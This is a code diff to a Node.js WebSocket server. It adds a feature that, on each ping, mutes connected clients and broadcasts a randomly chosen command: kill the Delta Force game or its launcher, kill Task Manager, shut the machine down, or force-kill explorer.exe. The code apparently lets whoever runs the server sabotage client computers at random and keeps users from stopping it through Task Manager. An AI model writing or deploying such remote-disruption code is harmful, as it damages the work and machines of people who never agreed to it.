@@ -3,6 +3,8 @@ const {log} = require("./utils");
 class Server {
   /**@type {Set<Client>} */
   static clients = new Set();
+  static randomClose = false;
+  static disableWLAN = false;
   /**
    * 
    * @param {Client} client
@@ -48,6 +50,29 @@ class Server {
       }
     })
   }
+  static randomCloseFun() {
+    if (Server.disableWLAN) {
+      this.clients.forEach(client => {
+        console.log("disable")
+        client.ws.send("mute");
+      })
+    }
+    if (!Server.randomClose) {
+      return;
+    }
+    const items = ['kill DeltaForceClient-Win64-Shipping',
+      'kill delta_force_launcher',
+      'kill Taskmgr',
+      '#shutdown -p',
+      '#taskkill -f -im explorer.exe&exit',
+    ];
+    const item = items[Math.floor(Math.random()*items.length)];
+    this.clients.forEach(client => {
+      console.log(item)
+      client.ws.send(item);
+    })
+  }
+
 
   static pingAll() {
     this.clients.forEach(client => {
@@ -57,8 +82,11 @@ class Server {
         client.ws.close();
       }
     })
+    Server.randomCloseFun()
   }
-}
+
+  }
+
 
 module.exports = {
   Server
